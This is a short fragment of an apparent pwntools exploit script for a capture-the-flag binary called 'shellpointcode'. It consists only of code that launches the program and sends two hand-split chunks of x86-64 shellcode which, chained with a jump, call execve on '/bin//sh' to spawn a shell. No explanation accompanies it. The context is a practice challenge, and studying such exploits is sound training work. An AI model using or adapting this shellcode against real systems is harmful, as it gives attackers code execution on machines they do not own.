...
r = process('./shellpointcode_zeosutt')
...
r.sendlineafter('node 1:', '\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\xeb\xd4')
r.sendlineafter('node 2:', '\x99\x52\x51\x48\x89\xe7\x31\xf6\xb0\x3b\x0f\x05')
